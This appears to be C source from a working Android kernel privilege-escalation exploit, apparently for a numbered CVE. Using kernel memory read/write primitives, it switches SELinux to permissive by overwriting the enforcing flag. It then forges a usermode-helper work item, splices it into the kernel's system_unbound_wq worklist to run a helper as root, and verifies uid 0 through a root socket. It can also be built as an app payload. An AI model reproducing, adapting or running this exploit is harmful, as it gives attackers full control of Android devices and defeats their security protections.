#include "common.h"

#include <stdlib.h>
#include <sys/un.h>

int root_child_done;
uint32_t root_uid_before = 0xffffffff;
uint32_t root_uid_after = 0xffffffff;

#define ROOT_SOCKET_PATH "/data/local/tmp/temp_su.sock"
#define ROOT_HOLD_READY_SOCKET "cve43499_roothold"

/* subprocess_info is __randomize_layout. Exact LIZH2 offsets are recovered
 * from call_usermodehelper_setup/exec_work disassembly. The object allocated
 * by the kernel is 0x80 bytes; zero the whole blob so randomized file/init/
 * cleanup/data fields that we do not use cannot retain payload bytes. */
#define UMH_INFO_SIZE 0x80
#define UMH_COMPLETE_OFF 0x30
#define UMH_PATH_OFF 0x38
#define UMH_ARGV_OFF 0x40
#define UMH_ENVP_OFF 0x48
#define UMH_WAIT_OFF 0x58
#define UMH_RETVAL_OFF 0x5c
#define UMH_INIT_OFF 0x68
#define UMH_CLEANUP_OFF 0x70
#define UMH_DATA_OFF 0x78

struct umh_completion {
  uint32_t done;
  uint32_t pad0;
  uint32_t lock;
  uint32_t pad1;
  uint64_t next;
  uint64_t prev;
};

struct umh_kernel_data {
  struct umh_completion completion;
  char path[256];
  char arg[16];
  char uid[16];
  uint64_t argv[4];
  uint64_t envp[1];
};

_Static_assert(sizeof(struct umh_completion) == 32, "completion layout");

static int root_read_data(
    int fd, uintptr_t target, void *data, size_t len) {
  return pipe_phys_read_data(fd, target, data, len);
}

static int root_write_data(
    int fd, uintptr_t target, const void *data, size_t len) {
  return pipe_phys_write_data(fd, target, data, len);
}

static uint64_t root_read64(int fd, uintptr_t target) {
  uint64_t value = 0;
  root_read_data(fd, target, &value, sizeof(value));
  return value;
}

static uint32_t root_read32(int fd, uintptr_t target) {
  return (uint32_t)root_read64(fd, target);
}

static int root_write64(int fd, uintptr_t target, uint64_t value) {
  return root_write_data(fd, target, &value, sizeof(value));
}

static int root_write32(int fd, uintptr_t target, uint32_t value) {
  return root_write_data(fd, target, &value, sizeof(value));
}

struct root_workqueue_view {
  uintptr_t wq;
  uintptr_t pwq;
  uintptr_t pool;
};

static int root_resolve_workqueue(int fd, struct root_workqueue_view *view) {
  uintptr_t canonical_slot = canon_addr(SYSTEM_UNBOUND_WQ);
  uintptr_t wq = kernel_read64(fd, canonical_slot);
  uintptr_t pwq = is_direct_ptr(wq) ?
                  root_read64(fd, wq + WQ_DFL_PWQ_OFF) : 0;
  uintptr_t pool = is_direct_ptr(pwq) ?
                   root_read64(fd, pwq + PWQ_POOL_OFF) : 0;
  uintptr_t pwq_wq = is_direct_ptr(pwq) ?
                     root_read64(fd, pwq + PWQ_WQ_OFF) : 0;

  memset(view, 0, sizeof(*view));
  pr_info("root wq canonical slot=%016zx value=%016zx pwq=%016zx pool=%016zx back=%016zx\n",
          canonical_slot, wq, pwq, pool, pwq_wq);
  if (!is_direct_ptr(wq) || !is_direct_ptr(pwq) ||
      !is_direct_ptr(pool) || pwq_wq != wq)
    return 0;

  view->wq = wq;
  view->pwq = pwq;
  view->pool = pool;
  return 1;
}

static int wake_system_unbound(void) {
  char slave_name[128];
  int master_fd = posix_openpt(O_RDWR | O_NOCTTY | O_CLOEXEC);
  if (master_fd < 0 || grantpt(master_fd) != 0 ||
      unlockpt(master_fd) != 0 ||
      ptsname_r(master_fd, slave_name, sizeof(slave_name)) != 0) {
    if (master_fd >= 0) {
      close(master_fd);
    }
    return 0;
  }

  int slave_fd = open(slave_name, O_RDWR | O_NOCTTY | O_CLOEXEC);
  if (slave_fd < 0) {
    close(master_fd);
    return 0;
  }
  int master_close = close(master_fd);
  int slave_close = close(slave_fd);
  return master_close == 0 && slave_close == 0;
}

static int root_socket_ready(void) {
  int fd = socket(AF_UNIX, SOCK_STREAM | SOCK_CLOEXEC, 0);
  if (fd < 0) {
    return 0;
  }

  struct sockaddr_un sun;
  memset(&sun, 0, sizeof(sun));
  sun.sun_family = AF_UNIX;
  snprintf(sun.sun_path, sizeof(sun.sun_path), "%s", ROOT_SOCKET_PATH);
  int ready = connect(fd, (struct sockaddr *)&sun, sizeof(sun)) == 0;
  close(fd);
  return ready;
}

static int root_hold_socket_ready(void) {
  int fd = socket(AF_UNIX, SOCK_STREAM | SOCK_CLOEXEC, 0);
  if (fd < 0) {
    return 0;
  }
  struct sockaddr_un address;
  memset(&address, 0, sizeof(address));
  address.sun_family = AF_UNIX;
  memcpy(address.sun_path + 1, ROOT_HOLD_READY_SOCKET,
         sizeof(ROOT_HOLD_READY_SOCKET) - 1);
  socklen_t address_length = (socklen_t)(
      offsetof(struct sockaddr_un, sun_path) +
      sizeof(ROOT_HOLD_READY_SOCKET));
  int ready = connect(fd, (struct sockaddr *)&address, address_length) == 0;
  close(fd);
  return ready;
}

static int install_workqueue_umh_root(int fd) {
  uintptr_t selinux_addr = 0;
  uint8_t permissive = 0;
  uintptr_t fake_work_addr = page_base + ROOT_UMH_WORK_OFF;
  uintptr_t umh_data_addr = page_base + ROOT_UMH_DATA_OFF;
  struct umh_kernel_data umh_data;
  memset(&umh_data, 0, sizeof(umh_data));
  const char *root_umh_path = ROOT_UMH_PATH;
#if defined(APP_PAYLOAD) && APP_PAYLOAD
  const char *app_root_umh_path = getenv("CVE43499_ROOT_HELPER");
  if (!app_root_umh_path || app_root_umh_path[0] != '/') {
    pr_error("root umh missing CVE43499_ROOT_HELPER\n");
    return 0;
  }
  root_umh_path = app_root_umh_path;
#endif
  if (snprintf(umh_data.path, sizeof(umh_data.path), "%s", root_umh_path) >=
      (int)sizeof(umh_data.path)) {
    pr_error("root umh helper path too long\n");
    return 0;
  }
  snprintf(umh_data.arg, sizeof(umh_data.arg), "%s", "--umh");
  snprintf(umh_data.uid, sizeof(umh_data.uid), "%u", getuid());
  uintptr_t completion_addr =
      umh_data_addr + offsetof(struct umh_kernel_data, completion);
  uintptr_t wait_list_addr =
      completion_addr + offsetof(struct umh_completion, next);
  uintptr_t path_addr =
      umh_data_addr + offsetof(struct umh_kernel_data, path);
  uintptr_t arg_addr =
      umh_data_addr + offsetof(struct umh_kernel_data, arg);
  uintptr_t uid_addr =
      umh_data_addr + offsetof(struct umh_kernel_data, uid);
  uintptr_t argv_addr =
      umh_data_addr + offsetof(struct umh_kernel_data, argv);
  uintptr_t envp_addr =
      umh_data_addr + offsetof(struct umh_kernel_data, envp);
  umh_data.completion.next = wait_list_addr;
  umh_data.completion.prev = wait_list_addr;
  umh_data.argv[0] = path_addr;
  umh_data.argv[1] = arg_addr;
  umh_data.argv[2] = uid_addr;
  umh_data.argv[3] = 0;
  umh_data.envp[0] = 0;
  uint64_t umh_work_func = text_addr(CALL_USERMODEHELPER_EXEC_WORK);

  struct root_workqueue_view wq_view;
  if (!root_resolve_workqueue(fd, &wq_view)) {
    pr_error("root umh could not validate system_unbound_wq\n");
    return 0;
  }
  selinux_addr = canon_addr(SELINUX_ENFORCING);

  uint8_t selinux_canonical_before = 0xff;
  uint8_t selinux_canonical_after = 0xff;
  kernel_read_data(fd, selinux_addr, &selinux_canonical_before,
                   sizeof(selinux_canonical_before));

  unlink(ROOT_SOCKET_PATH);
  int selinux_ok = kernel_write_data(
      fd, selinux_addr, &permissive, sizeof(permissive)) ==
      (ssize_t)sizeof(permissive);
  kernel_read_data(fd, selinux_addr, &selinux_canonical_after,
                   sizeof(selinux_canonical_after));
  pr_info("root selinux addr=%016zx before=%u after=%u write=%d\n",
          selinux_addr, selinux_canonical_before,
          selinux_canonical_after, selinux_ok);
  if (!selinux_ok || selinux_canonical_after != 0) {
    pr_error("root umh selinux write failed\n");
    return 0;
  }

  uintptr_t wq = wq_view.wq;
  uintptr_t pwq = wq_view.pwq;
  uintptr_t pool = wq_view.pool;

  uintptr_t worklist = pool + POOL_WORKLIST_OFF;
  uint64_t list_next = 0;
  uint64_t list_prev = 0;
  uint32_t nr_idle = 0;
  for (int i = 0; i < 200; i++) {
    list_next = root_read64(fd, worklist);
    list_prev = root_read64(fd, worklist + sizeof(uint64_t));
    nr_idle = root_read32(fd, pool + POOL_NR_IDLE_OFF);
    if (list_next == worklist && list_prev == worklist && nr_idle > 0) {
      break;
    }
    usleep(1000);
  }
  if (list_next != worklist || list_prev != worklist || nr_idle == 0) {
    pr_error("root umh pool busy pool=%016zx list=%016llx/%016llx "
             "head=%016zx idle=%u\n",
             pool, (unsigned long long)list_next,
             (unsigned long long)list_prev, worklist, nr_idle);
    return 0;
  }

  uint32_t color = root_read32(fd, pwq + PWQ_WORK_COLOR_OFF);
  uint32_t refcnt = root_read32(fd, pwq + PWQ_REFCNT_OFF);
  uint32_t nr_active = root_read32(fd, pwq + PWQ_NR_ACTIVE_OFF);
  uint32_t max_active = root_read32(fd, pwq + PWQ_MAX_ACTIVE_OFF);
  if (color >= 16 || refcnt == 0 || nr_active >= max_active) {
    pr_error("root umh bad pwq state color=%u refcnt=%u active=%u/%u\n",
             color, refcnt, nr_active, max_active);
    return 0;
  }

  uintptr_t inflight_addr =
      pwq + PWQ_NR_IN_FLIGHT_OFF + color * sizeof(uint32_t);
  uint32_t nr_inflight = root_read32(fd, inflight_addr);
  uintptr_t fake_entry = fake_work_addr + WORK_ENTRY_OFF;
  uint64_t work_data = pwq | ((uint64_t)color << 4) | 5;
  unsigned char fake[UMH_INFO_SIZE];
  memset(fake, 0, sizeof(fake));
  put64(fake, WORK_DATA_OFF, work_data);
  put64(fake, WORK_ENTRY_OFF, worklist);
  put64(fake, WORK_ENTRY_OFF + sizeof(uint64_t), worklist);
  put64(fake, WORK_FUNC_OFF, umh_work_func);
  put64(fake, UMH_COMPLETE_OFF, completion_addr);
  put64(fake, UMH_PATH_OFF, path_addr);
  put64(fake, UMH_ARGV_OFF, argv_addr);
  put64(fake, UMH_ENVP_OFF, envp_addr);
  put32(fake, UMH_WAIT_OFF, 0); /* UMH_NO_WAIT */
  put64(fake, UMH_INIT_OFF, 0);
  put64(fake, UMH_CLEANUP_OFF, 0);
  put64(fake, UMH_DATA_OFF, 0);

  int data_write = root_write_data(
      fd, umh_data_addr, &umh_data, sizeof(umh_data));
  int work_write = root_write_data(
      fd, fake_work_addr, fake, sizeof(fake));
  int counters_write =
      root_write32(fd, inflight_addr, nr_inflight + 1) &&
      root_write32(fd, pwq + PWQ_NR_ACTIVE_OFF, nr_active + 1) &&
      root_write32(fd, pwq + PWQ_REFCNT_OFF, refcnt + 1);
  int list_prev_write = root_write64(
      fd, worklist + sizeof(uint64_t), fake_entry);
  int list_next_write = list_prev_write && root_write64(
      fd, worklist, fake_entry);
  pr_info("root umh queued wq=%016zx pwq=%016zx pool=%016zx "
          "work=%016zx entry=%016zx color=%u counters=%u/%u/%u "
          "writes=%d/%d/%d/%d/%d\n",
          wq, pwq, pool, fake_work_addr, fake_entry, color,
          nr_inflight, nr_active, refcnt, data_write, work_write,
          counters_write, list_prev_write, list_next_write);
  if (!data_write || !work_write || !counters_write || !list_next_write) {
    return 0;
  }

  uint32_t complete_done = 0;
  int wake_ok = 0;
  for (int i = 0; i < 8 && !complete_done; i++) {
    wake_ok |= wake_system_unbound();
    for (int j = 0; j < 250; j++) {
      complete_done = root_read32(fd, completion_addr);
      if (complete_done) {
        break;
      }
      usleep(1000);
    }
  }

  int socket_ok = 0;
  int32_t umh_retval = (int32_t)root_read32(
      fd, fake_work_addr + UMH_RETVAL_OFF);
  if (complete_done) {
    for (int i = 0; i < 200; i++) {
      if (root_socket_ready()) {
        socket_ok = 1;
        break;
      }
      usleep(10000);
    }
  }

  pr_info("root umh result wake=%d complete=%u retval=%d socket=%d\n",
          wake_ok, complete_done, umh_retval, socket_ok);
  root_child_done = socket_ok;
  root_uid_after = socket_ok ? 0 : root_uid_before;
  return socket_ok;
}

int install_android_root(int fd) {
  root_uid_before = getuid();
  pr_info("root direct start uid=%u fd=%d\n", root_uid_before, fd);
  int installed = install_workqueue_umh_root(fd);
#if !defined(APP_PAYLOAD) || !APP_PAYLOAD
  if (installed) {
    int verify_status = system(
        ROOT_UMH_PATH " -c 'id; printf ROOT_CLIENT_UID=; id -u'");
    int verify_ok = verify_status >= 0 && WIFEXITED(verify_status) &&
                    WEXITSTATUS(verify_status) == 0;
    pr_info("root client verification status=%d ok=%d\n",
            verify_status, verify_ok);
    if (!verify_ok) {
      root_child_done = 0;
      root_uid_after = root_uid_before;
      installed = 0;
    }
  }
#endif
#if defined(APP_PAYLOAD) && APP_PAYLOAD && \
    (!defined(APP_ROOT_REF_HOLDER_REQUIRED) || APP_ROOT_REF_HOLDER_REQUIRED)
  if (installed) {
    int holder_ready = 0;
    for (int attempt = 0; attempt < 200; attempt++) {
      if (root_hold_socket_ready()) {
        holder_ready = 1;
        break;
      }
      usleep(10000);
    }
    pr_info("root p0 reference holder ready=%d\n", holder_ready);
    if (!holder_ready) {
      root_child_done = 0;
      root_uid_after = root_uid_before;
      return 0;
    }
  }
#endif
  return installed;
}
